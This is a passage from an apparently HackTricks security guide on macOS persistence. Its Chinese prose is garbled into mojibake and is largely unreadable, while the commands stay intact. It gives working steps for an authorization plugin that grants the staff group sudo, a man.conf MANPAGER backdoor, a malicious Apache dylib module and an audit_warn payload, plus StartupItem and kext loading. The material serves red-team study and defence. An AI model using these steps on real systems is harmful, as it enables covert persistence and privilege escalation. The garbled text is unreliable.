<p><strong>å°†</strong>æ†ç»‘åŒ…ç§»åŠ¨åˆ°è¦åŠ è½½çš„ä½ç½®ï¼š</p>
<pre><code class="language-bash">cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
</code></pre>
<p>æœ€åæ·»åŠ <strong>è§„åˆ™</strong>ä»¥åŠ è½½æ­¤æ’ä»¶ï¼š</p>
<pre><code class="language-bash">cat &gt; /tmp/rule.plist &lt;&lt;EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;class&lt;/key&gt;
&lt;string&gt;evaluate-mechanisms&lt;/string&gt;
&lt;key&gt;mechanisms&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;CustomAuth:login,privileged&lt;/string&gt;
&lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

security authorizationdb write com.asdf.asdf &lt; /tmp/rule.plist
</code></pre>
<p><strong><code>evaluate-mechanisms</code></strong> å°†å‘Šè¯‰æˆæƒæ¡†æ¶å®ƒéœ€è¦ <strong>è°ƒç”¨å¤–éƒ¨æœºåˆ¶è¿›è¡Œæˆæƒ</strong>ã€‚æ­¤å¤–ï¼Œ<strong><code>privileged</code></strong> å°†ä½¿å…¶ç”± root æ‰§è¡Œã€‚</p>
<p>é€šè¿‡ä»¥ä¸‹æ–¹å¼è§¦å‘å®ƒï¼š</p>
<pre><code class="language-bash">security authorize com.asdf.asdf
</code></pre>
<p>ç„¶å<strong>staffç»„åº”è¯¥æ‹¥æœ‰sudo</strong>è®¿é—®æƒé™ï¼ˆé˜…è¯»<code>/etc/sudoers</code>ä»¥ç¡®è®¤ï¼‰ã€‚</p>
<h3 id="manconf"><a class="header" href="#manconf">Man.conf</a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0030/">https://theevilbit.github.io/beyond/beyond_0030/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ éœ€è¦æ˜¯rootï¼Œç”¨æˆ·å¿…é¡»ä½¿ç”¨man</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-24"><a class="header" href="#ä½ç½®-24">ä½ç½®</a></h4>
<ul>
<li><strong><code>/private/etc/man.conf</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
<li><strong><code>/private/etc/man.conf</code></strong>: æ¯å½“ä½¿ç”¨manæ—¶</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-16"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-16">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>é…ç½®æ–‡ä»¶**<code>/private/etc/man.conf</code>**æŒ‡ç¤ºåœ¨æ‰“å¼€manæ–‡æ¡£æ–‡ä»¶æ—¶ä½¿ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶/è„šæœ¬ã€‚å› æ­¤ï¼Œå¯ä»¥ä¿®æ”¹å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œä»¥ä¾¿æ¯å½“ç”¨æˆ·ä½¿ç”¨mané˜…è¯»æ–‡æ¡£æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€ä¸ªåé—¨ã€‚</p>
<p>ä¾‹å¦‚åœ¨**<code>/private/etc/man.conf</code>**ä¸­è®¾ç½®:</p>
<pre><code>MANPAGER /tmp/view
</code></pre>
<p>ç„¶ååˆ›å»º <code>/tmp/view</code> ä¸ºï¼š</p>
<pre><code class="language-bash">#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
</code></pre>
<h3 id="apache2"><a class="header" href="#apache2">Apache2</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0023/">https://theevilbit.github.io/beyond/beyond_0023/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç®±: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ éœ€è¦æ˜¯rootï¼Œå¹¶ä¸”apacheéœ€è¦æ­£åœ¨è¿è¡Œ</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
<li>Httpdæ²¡æœ‰æƒé™</li>
</ul>
<h4 id="ä½ç½®-25"><a class="header" href="#ä½ç½®-25">ä½ç½®</a></h4>
<ul>
<li><strong><code>/etc/apache2/httpd.conf</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
<li>è§¦å‘: å½“Apache2å¯åŠ¨æ—¶</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-17"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-17">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>ä½ å¯ä»¥åœ¨<code>/etc/apache2/httpd.conf</code>ä¸­æŒ‡ç¤ºåŠ è½½ä¸€ä¸ªæ¨¡å—ï¼Œæ·»åŠ ä¸€è¡Œå¦‚ä¸‹:</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
</code></pre>
<p>{% endcode %}</p>
<p>è¿™æ ·ï¼Œæ‚¨çš„ç¼–è¯‘æ¨¡å—å°†ç”± Apache åŠ è½½ã€‚å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‚¨éœ€è¦ <strong>ç”¨æœ‰æ•ˆçš„ Apple è¯ä¹¦ç­¾å</strong>ï¼Œæˆ–è€…æ‚¨éœ€è¦ <strong>åœ¨ç³»ç»Ÿä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„å—ä¿¡ä»»è¯ä¹¦</strong> å¹¶ <strong>ç”¨å®ƒç­¾å</strong>ã€‚</p>
<p>ç„¶åï¼Œå¦‚æœéœ€è¦ï¼Œç¡®ä¿æœåŠ¡å™¨å°†å¯åŠ¨ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
</code></pre>
<p>Dylbçš„ä»£ç ç¤ºä¾‹ï¼š</p>
<pre><code class="language-objectivec">#include &lt;stdio.h&gt;
#include &lt;syslog.h&gt;

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
</code></pre>
<h3 id="bsmå®¡è®¡æ¡†æ¶"><a class="header" href="#bsmå®¡è®¡æ¡†æ¶">BSMå®¡è®¡æ¡†æ¶</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0031/">https://theevilbit.github.io/beyond/beyond_0031/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ éœ€è¦æ˜¯rootï¼Œauditdéœ€è¦è¿è¡Œå¹¶å¼•å‘è­¦å‘Š</li>
<li>TCCç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-26"><a class="header" href="#ä½ç½®-26">ä½ç½®</a></h4>
<ul>
<li><strong><code>/etc/security/audit_warn</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
<li><strong>è§¦å‘</strong>: å½“auditdæ£€æµ‹åˆ°è­¦å‘Šæ—¶</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-18"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-18">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>æ¯å½“auditdæ£€æµ‹åˆ°è­¦å‘Šæ—¶ï¼Œè„šæœ¬**<code>/etc/security/audit_warn</code><strong>ä¼šè¢«</strong>æ‰§è¡Œ**ã€‚å› æ­¤ä½ å¯ä»¥åœ¨å…¶ä¸­æ·»åŠ ä½ çš„æœ‰æ•ˆè½½è·ã€‚</p>
<pre><code class="language-bash">echo "touch /tmp/auditd_warn" &gt;&gt; /etc/security/audit_warn
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <code>sudo audit -n</code> å¼ºåˆ¶å‘å‡ºè­¦å‘Šã€‚</p>
<h3 id="å¯åŠ¨é¡¹"><a class="header" href="#å¯åŠ¨é¡¹">å¯åŠ¨é¡¹</a></h3>
<p>{% hint style="danger" %}
<strong>è¿™å·²è¢«å¼ƒç”¨ï¼Œå› æ­¤è¿™äº›ç›®å½•ä¸­ä¸åº”æ‰¾åˆ°ä»»ä½•å†…å®¹ã€‚</strong>
{% endhint %}</p>
<p><strong>StartupItem</strong> æ˜¯ä¸€ä¸ªç›®å½•ï¼Œåº”è¯¥ä½äº <code>/Library/StartupItems/</code> æˆ– <code>/System/Library/StartupItems/</code> ä¸­ã€‚ä¸€æ—¦å»ºç«‹æ­¤ç›®å½•ï¼Œå®ƒå¿…é¡»åŒ…å«ä¸¤ä¸ªç‰¹å®šæ–‡ä»¶ï¼š</p>
<ol>
<li>ä¸€ä¸ª <strong>rc è„šæœ¬</strong>ï¼šåœ¨å¯åŠ¨æ—¶æ‰§è¡Œçš„ shell è„šæœ¬ã€‚</li>
<li>ä¸€ä¸ª <strong>plist æ–‡ä»¶</strong>ï¼Œç‰¹å®šå‘½åä¸º <code>StartupParameters.plist</code>ï¼Œå…¶ä¸­åŒ…å«å„ç§é…ç½®è®¾ç½®ã€‚</li>
</ol>
<p>ç¡®ä¿ rc è„šæœ¬å’Œ <code>StartupParameters.plist</code> æ–‡ä»¶æ­£ç¡®æ”¾ç½®åœ¨ <strong>StartupItem</strong> ç›®å½•ä¸­ï¼Œä»¥ä¾¿å¯åŠ¨è¿‡ç¨‹èƒ½å¤Ÿè¯†åˆ«å’Œä½¿ç”¨å®ƒä»¬ã€‚</p>
<p>{% tabs %}
{% tab title="StartupParameters.plist" %}</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Description&lt;/key&gt;
&lt;string&gt;This is a description of this service&lt;/string&gt;
&lt;key&gt;OrderPreference&lt;/key&gt;
&lt;string&gt;None&lt;/string&gt; &lt;!--Other req services to execute before this --&gt;
&lt;key&gt;Provides&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;superservicename&lt;/string&gt; &lt;!--Name of the services provided by this file --&gt;
&lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="è¶…çº§æœåŠ¡åç§°" %}</p>
<pre><code class="language-bash">#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h3 id="emond"><a class="header" href="#emond"><del>emond</del></a></h3>
<p>{% hint style="danger" %}
æˆ‘åœ¨æˆ‘çš„ macOS ä¸­æ‰¾ä¸åˆ°è¿™ä¸ªç»„ä»¶ï¼Œå› æ­¤æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹å†™ä½œ
{% endhint %}</p>
<p>å†™ä½œï¼š<a href="https://theevilbit.github.io/beyond/beyond_0023/">https://theevilbit.github.io/beyond/beyond_0023/</a></p>
<p>ç”±è‹¹æœå…¬å¸å¼•å…¥ï¼Œ<strong>emond</strong> æ˜¯ä¸€ç§æ—¥å¿—è®°å½•æœºåˆ¶ï¼Œä¼¼ä¹æœªå¾—åˆ°å……åˆ†å¼€å‘æˆ–å¯èƒ½è¢«é—å¼ƒï¼Œä½†ä»ç„¶å¯ä»¥è®¿é—®ã€‚è™½ç„¶å¯¹ Mac ç®¡ç†å‘˜æ¥è¯´å¹¶ä¸ç‰¹åˆ«æœ‰ç›Šï¼Œä½†è¿™ä¸ªæ¨¡ç³Šçš„æœåŠ¡å¯èƒ½ä½œä¸ºå¨èƒè¡Œä¸ºè€…çš„å¾®å¦™æŒä¹…æ€§æ–¹æ³•ï¼Œå¯èƒ½ä¸ä¼šè¢«å¤§å¤šæ•° macOS ç®¡ç†å‘˜æ³¨æ„åˆ°ã€‚</p>
<p>å¯¹äºé‚£äº›çŸ¥é“å…¶å­˜åœ¨çš„äººï¼Œè¯†åˆ« <strong>emond</strong> çš„ä»»ä½•æ¶æ„ä½¿ç”¨æ˜¯ç®€å•çš„ã€‚è¯¥æœåŠ¡çš„ç³»ç»Ÿ LaunchDaemon åœ¨ä¸€ä¸ªç›®å½•ä¸­å¯»æ‰¾è¦æ‰§è¡Œçš„è„šæœ¬ã€‚è¦æ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="language-bash">ls -l /private/var/db/emondClients
</code></pre>
<h3 id="xquartz"><a class="header" href="#xquartz"><del>XQuartz</del></a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0018/">https://theevilbit.github.io/beyond/beyond_0018/</a></p>
<h4 id="ä½ç½®-27"><a class="header" href="#ä½ç½®-27">ä½ç½®</a></h4>
<ul>
<li><strong><code>/opt/X11/etc/X11/xinit/privileged_startx.d</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
<li><strong>è§¦å‘</strong>: ä½¿ç”¨XQuartz</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-19"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-19">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>XQuartz <strong>ä¸å†å®‰è£…åœ¨macOSä¸­</strong>ï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³è¦æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹å†™ä½œã€‚</p>
<h3 id="kext"><a class="header" href="#kext"><del>kext</del></a></h3>
<p>{% hint style="danger" %}
å³ä½¿ä½œä¸ºrootå®‰è£…kextä¹Ÿéå¸¸å¤æ‚ï¼Œå› æ­¤æˆ‘ä¸ä¼šè€ƒè™‘è¿™ä½œä¸ºé€ƒé¿æ²™ç®±æˆ–æŒä¹…æ€§çš„æ–¹æ³•ï¼ˆé™¤éä½ æœ‰ä¸€ä¸ªæ¼æ´ï¼‰
{% endhint %}</p>
<h4 id="ä½ç½®-28"><a class="header" href="#ä½ç½®-28">ä½ç½®</a></h4>
<p>ä¸ºäº†å°†KEXTä½œä¸ºå¯åŠ¨é¡¹å®‰è£…ï¼Œå®ƒéœ€è¦<strong>å®‰è£…åœ¨ä»¥ä¸‹ä½ç½®ä¹‹ä¸€</strong>ï¼š</p>
<ul>
<li><code>/System/Library/Extensions</code></li>
<li>å†…ç½®äºOS Xæ“ä½œç³»ç»Ÿçš„KEXTæ–‡ä»¶ã€‚</li>
<li><code>/Library/Extensions</code></li>
<li>ç”±ç¬¬ä¸‰æ–¹è½¯ä»¶å®‰è£…çš„KEXTæ–‡ä»¶</li>
</ul>
<p>ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºå½“å‰åŠ è½½çš„kextæ–‡ä»¶ï¼š</p>
<pre><code class="language-bash">kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
</code></pre>
<p>å¯¹äºæœ‰å…³<a href="macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers"><strong>å†…æ ¸æ‰©å±•çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æœ¬èŠ‚</strong></a>ã€‚</p>
<h3 id="amstoold"><a class="header" href="#amstoold"><del>amstoold</del></a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0029/">https://theevilbit.github.io/beyond/beyond_0029/</a></p>
<h4 id="ä½ç½®-29"><a class="header" href="#ä½ç½®-29">ä½ç½®</a></h4>
<ul>
<li><strong><code>/usr/local/bin/amstoold</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-20"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-20">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>æ˜¾ç„¶ï¼Œ<code>/System/Library/LaunchAgents/com.apple.amstoold.plist</code>ä¸­çš„<code>plist</code>æ­£åœ¨ä½¿ç”¨è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒæ—¶æš´éœ²äº†ä¸€ä¸ªXPCæœåŠ¡â€¦â€¦é—®é¢˜æ˜¯è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œå› æ­¤ä½ å¯ä»¥åœ¨è¿™é‡Œæ”¾ç½®ä¸€äº›ä¸œè¥¿ï¼Œå½“XPCæœåŠ¡è¢«è°ƒç”¨æ—¶ï¼Œä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶å°†è¢«è°ƒç”¨ã€‚</p>
<p>æˆ‘åœ¨æˆ‘çš„macOSä¸­å†ä¹Ÿæ‰¾ä¸åˆ°è¿™ä¸ªã€‚</p>
<h3 id="xsanctl"><a class="header" href="#xsanctl"><del>xsanctl</del></a></h3>
<p>å†™ä½œ: <a href="https://theevilbit.github.io/beyond/beyond_0015/">https://theevilbit.github.io/beyond/beyond_0015/</a></p>
<h4 id="ä½ç½®-30"><a class="header" href="#ä½ç½®-30">ä½ç½®</a></h4>
<ul>
<li><strong><code>/Library/Preferences/Xsan/.xsanrc</code></strong></li>
<li>éœ€è¦rootæƒé™</li>
<li><strong>è§¦å‘</strong>: å½“æœåŠ¡è¿è¡Œæ—¶ï¼ˆå¾ˆå°‘ï¼‰</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-21"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-21">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>æ˜¾ç„¶ï¼Œè¿è¡Œè¿™ä¸ªè„šæœ¬å¹¶ä¸å¸¸è§ï¼Œæˆ‘ç”šè‡³åœ¨æˆ‘çš„macOSä¸­æ‰¾ä¸åˆ°å®ƒï¼Œå› æ­¤å¦‚æœä½ æƒ³è¦æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹å†™ä½œã€‚</p>
<h3 id="etcrccommon"><a class="header" href="#etcrccommon"><del>/etc/rc.common</del></a></h3>
<p>{% hint style="danger" %}
<strong>è¿™åœ¨ç°ä»£MacOSç‰ˆæœ¬ä¸­ä¸èµ·ä½œç”¨</strong>
{% endhint %}</p>
<p>åœ¨è¿™é‡Œä¹Ÿå¯ä»¥æ”¾ç½®<strong>åœ¨å¯åŠ¨æ—¶æ‰§è¡Œçš„å‘½ä»¤ã€‚</strong> ç¤ºä¾‹æ˜¯å¸¸è§„çš„rc.commonè„šæœ¬:</p>
<pre><code class="language-bash">#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] &amp;&amp; [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2&gt;/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2&gt; /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
</code></pre>
<h2 id="æŒä¹…æ€§æŠ€æœ¯å’Œå·¥å…·"><a class="header" href="#æŒä¹…æ€§æŠ€æœ¯å’Œå·¥å…·">æŒä¹…æ€§æŠ€æœ¯å’Œå·¥å…·</a></h2>
<ul>
<li><a href="https://github.com/cedowens/Persistent-Swift">https://github.com/cedowens/Persistent-Swift</a></li>
<li><a href="https://github.com/D00MFist/PersistentJXA">https://github.com/D00MFist/PersistentJXA</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../macos-hardening/macos-useful-commands.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../windows-hardening/checklist-windows-privilege-escalation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../macos-hardening/macos-useful-commands.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../windows-hardening/checklist-windows-privilege-escalation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
